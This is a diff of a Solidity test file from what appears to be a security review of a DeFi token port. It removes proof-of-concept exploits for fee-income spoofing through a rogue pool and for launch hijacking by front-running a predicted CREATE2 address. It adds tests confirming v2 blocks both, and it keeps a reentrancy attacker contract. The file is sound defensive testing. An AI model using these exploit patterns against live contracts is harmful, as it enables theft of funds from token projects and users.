@@ -7,7 +7,10 @@ import {PoolKey} from "v4-core/src/types/PoolKey.sol";
 import {Fixture} from "./utils/Fixture.sol";
 import {ICore} from "../src/interfaces/ICore.sol";
 import {IControllerV1} from "../src/interfaces/IControllerV1.sol";
-import {IArtCoinsFactory} from "../src/interfaces/ArtCoins.sol";
+import {IArtCoinsFactoryV2} from "../src/interfaces/ArtCoinsV2.sol";
+import {IFeeRouter} from "../src/interfaces/IFeeRouter.sol";
+import {Currency} from "v4-core/src/types/Currency.sol";
+import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
 import {MockExitToken} from "./standins/MockExitToken.sol";
 import {MockExitModule} from "./standins/MockExitModule.sol";
 import {Mainnet, Settings} from "../src/interfaces/Interfaces.sol";
@@ -17,12 +20,6 @@ import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
 import {FullMath} from "v4-core/src/libraries/FullMath.sol";
 import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
 
-interface IHookOpen {
-    function initializePoolOpen(address artCoin, address paired, int24 tick, int24 spacing, bytes calldata poolData)
-        external
-        returns (PoolKey memory);
-}
-
 /// independent review of the artcoins port. `test_POC_*` prove a finding on the pinned fork, `test_held_*` are
 /// attacks that failed. every number quoted in docs/REVIEW-port.md comes from a log line in this file.
 /// a plain receive only bounty recipient, which the hook's `streamForward` probe survives
@@ -30,8 +27,8 @@ contract Sink {
     receive() external payable {}
 }
 
-/// swaps once in the real pool from inside the eth callback of a core payout, so the hook pushes its bounty into
-/// the core while the core is in the middle of a door
+/// swaps once in the real pool from inside the eth callback of a core payout, then flushes the fee router, so the
+/// router pushes the fees into the core while the core is in the middle of a door
 contract SwapOnReceive {
     TestSwapRouter public immutable router;
     PoolKey internal key;
@@ -64,10 +61,18 @@ contract SwapOnReceive {
         return this.onERC721Received.selector;
     }
 
+    IFeeRouter public feeRouter;
+
+    function setFeeRouter(address r) external {
+        feeRouter = IFeeRouter(payable(r));
+    }
+
     receive() external payable {
         if (swapEth != 0 && !fired) {
             fired = true;
             router.swap{value: swapEth}(key, true, -int256(swapEth), address(this));
+            // the v2 hook pays the fee router, whose flush is what lands the eth in the core mid door
+            if (address(feeRouter) != address(0)) feeRouter.flush();
         }
     }
 }
@@ -95,38 +100,23 @@ contract ReviewPort is Fixture {
         _buyCoin(_user("trader"), 20 ether);
     }
 
-    function _openPool(address bountyTo, uint24 baseline, int24 spacing) internal returns (PoolKey memory k) {
-        bytes memory feeData =
-            abi.encode(baseline, uint16(9999), uint24(0), uint24(0), bountyTo, creator, address(core), address(0));
-        k = IHookOpen(Mainnet.SKIM_HOOK)
-            .initializePoolOpen(address(coin), address(0), -60_000, spacing, abi.encode(address(0), bytes(""), feeData));
-    }
+    // ------------------------------------------------------------------ P-1 open pool spoofs fee income (gone on v2)
 
-    // ------------------------------------------------------------------ P-1 open pool spoofs fee income (donation)
-
-    /// anyone can open a second pool of the coin on the live hook and name the core as its bounty recipient. the
-    /// hook then pushes eth to `receive()` with msg.sender == hook, and the core books it as fee income
-    function test_POC_openPoolSpoofsFeeIncome() public {
-        _stockPool();
-        uint64 fillBefore = core.lastFillTime();
+    /// on v1 anyone could open a second pool on the live hook naming the core as bounty recipient, and the hook's push
+    /// was booked as fee income. on v2 only a launcher (the factory) can open a pool on the hook, and the core books eth
+    /// from the fee router only. nobody can open a pool on the hook, and eth the hook pushes to the core is not booked
+    function test_FIXED_v2HookRefusesAPoolFromAStranger() public {
+        PoolKey memory k =
+            PoolKey(Currency.wrap(address(0)), Currency.wrap(address(coin)), 0x800000, 60, IHooks(lc.stack.hook));
         vm.prank(attacker);
-        PoolKey memory k = _openPool(address(core), 50_000, 60);
-        _buyCoin(attacker, 2 ether);
-        TestLiquidityHelper lp = new TestLiquidityHelper();
-        vm.startPrank(attacker);
-        coin.approve(address(lp), type(uint256).max);
-        lp.modify(k, 0, 60_000, 1e18);
-        vm.stopPrank();
-        vm.deal(attacker, 1 ether);
-        uint256 potBefore = core.ethPot();
-        vm.prank(attacker);
-        router.swap{value: 0.001 ether}(k, true, -int256(0.001 ether), attacker);
-        uint256 booked = core.ethPot() - potBefore;
-        emit log_named_uint("eth the attacker paid in the open pool", 0.001 ether);
-        emit log_named_uint("eth booked into the core pot by the spoof", booked);
-        assertGt(booked, 0.0004 ether, "open pool skim was booked as fee income");
-        assertEq(core.lastFillTime(), fillBefore, "no fill time change");
-        assertLe(core.ethPot() + core.ethToBuyback(), address(core).balance, "solvent");
+        vm.expectRevert();
+        PM.initialize(k, 79228162514264337593543950336);
+        // eth from the hook itself is accepted and left for skim
+        vm.deal(lc.stack.hook, 1 ether);
+        vm.prank(lc.stack.hook);
+        (bool ok,) = address(core).call{value: 1 ether}("");
+        assertTrue(ok);
+        assertEq(core.ethPot(), 0, "a hook push is not fee income");
     }
 
     // ------------------------------------------------------------------ held: sandwich and jit liquidity on the 1 eth slice
@@ -335,57 +325,40 @@ contract ReviewPort is Fixture {
         }
     }
 
-    // ------------------------------------------------------------------ P-4 launch hijack of the predicted coin (artcoins T-1)
+    // ------------------------------------------------------------------ P-4 launch hijack of the predicted coin (gone on v2)
 
-    /// once the factory is open (`deprecated` false) anyone who sees the launch can copy the token and tax config,
-    /// keep the predicted coin address and put their own bounty recipient in the pool. the core is already deployed
-    /// against that address (immutable), so it is bound for good to a pool that never pays it
-    function test_POC_launchHijackLeavesTheCoreDeadAgainstTheCoin() public {
-        vm.prank(Mainnet.ARTCOINS_FACTORY_OWNER);
-        (bool ok,) = Mainnet.ARTCOINS_FACTORY.call(abi.encodeWithSignature("setDeprecated(bool)", false));
-        assertTrue(ok);
+    /// on v1 the coin address did not depend on the sender, so with an open factory anyone could copy the config, take
+    /// the predicted address and bind the core to a pool that never pays it. on v2 `predictToken(sender, config)` folds
+    /// the sender into the salt: a copy launched by another account lands elsewhere, and the real launch still lands on
+    /// the address the core was built against. while the factory is deprecated a stranger cannot launch at all
+    function test_FIXED_launchHijackCannotTakeThePredictedCoin() public {
         bytes32 salt = keccak256("hijack victim");
-        address coreAt = vm.computeCreateAddress(deployer, vm.getNonce(deployer) + 1);
-        address coinAt = predictCoin(deployer, coreAt, "Victim", "VIC", salt);
-        vm.startPrank(deployer);
+        address coreAt = vm.computeCreateAddress(owner, vm.getNonce(owner) + 1);
+        address coinAt = predictCoin(owner, coreAt, "Victim", "VIC", salt);
+        vm.startPrank(owner);
         ICore core2 = Prod.newCore(
             owner, coinAt, address(Prod.newController(coreAt, lc.sale)), lc.stack, lc.rateStart, lc.settings
         );
         vm.stopPrank();
         assertEq(address(core2), coreAt);
 
-        // the attacker copies tokenConfig and taxConfig from the mempool and names itself in the pool
-        vm.deal(attacker, 1 ether);
-        address sink = address(new Sink());
-        vm.prank(attacker);
-        assertEq(
-            FACTORY.deployTokenWithProtocolBpsAndTax{value: FACTORY.deployFee()}(
-                buildConfig(deployer, sink, attacker, "Victim", "VIC", salt), 0, buildTaxConfig(coreAt)
-            ),
-            coinAt,
-            "the attacker got the predicted coin address"
-        );
-
-        // the real launch now reverts on the CREATE2 collision
-        vm.deal(deployer, 1 ether);
+        IArtCoinsFactoryV2.DeploymentConfigV2 memory cfg = buildConfig(owner, coreAt, creator, "Victim", "VIC", salt);
         uint256 fee = FACTORY.deployFee();
-        IArtCoinsFactory.DeploymentConfig memory cfg = buildConfig(deployer, coreAt, creator, "Victim", "VIC", salt);
-        IArtCoinsFactory.TaxConfig memory tax = buildTaxConfig(coreAt);
-        vm.prank(deployer);
+        vm.deal(attacker, 1 ether);
+        vm.prank(attacker);
         vm.expectRevert();
-        FACTORY.deployTokenWithProtocolBpsAndTax{value: fee}(cfg, 0, tax);
+        FACTORY.deployToken{value: fee}(cfg);
 
-        // trading starts: every skim point goes to the attacker, the core gets nothing and cannot rebind
-        vm.warp(block.timestamp + SNIPER_WINDOW + 1);
-        PoolKey memory key = poolKeyOf(coinAt);
-        address buyer = _user("buyer");
-        vm.deal(buyer, 10 ether);
-        vm.prank(buyer);
-        router.swap{value: 1 ether}(key, true, -1 ether, buyer);
-        emit log_named_uint("eth skim pushed to the attacker sink on a 1 eth buy", sink.balance);
-        emit log_named_uint("eth the victim core received", address(core2).balance);
-        assertGt(sink.balance, 0.09 ether);
-        assertEq(address(core2).balance, 0);
+        // the factory opens: the copy by the attacker lands on its own address
+        vm.prank(owner);
+        FACTORY.setDeprecated(false);
+        vm.prank(attacker);
+        address stolen = FACTORY.deployToken{value: fee}(cfg);
+        assertTrue(stolen != coinAt, "the sender is part of the address");
+
+        // and the real launch still gets the predicted address
+        vm.prank(owner);
+        assertEq(FACTORY.deployTokenAsOwner{value: fee}(cfg, lc.protocolBps), coinAt);
         assertEq(core2.COIN(), coinAt);
     }
 
@@ -400,6 +373,7 @@ contract ReviewPort is Fixture {
     function test_held_swapInsidePayoutCallbacks() public {
         _stockPool();
         SwapOnReceive actor = new SwapOnReceive(router, launchKey);
+        actor.setFeeRouter(address(feeRouter));
         vm.deal(address(actor), 50 ether);
         _fundPot(2 ether);
         _assertClean("start");
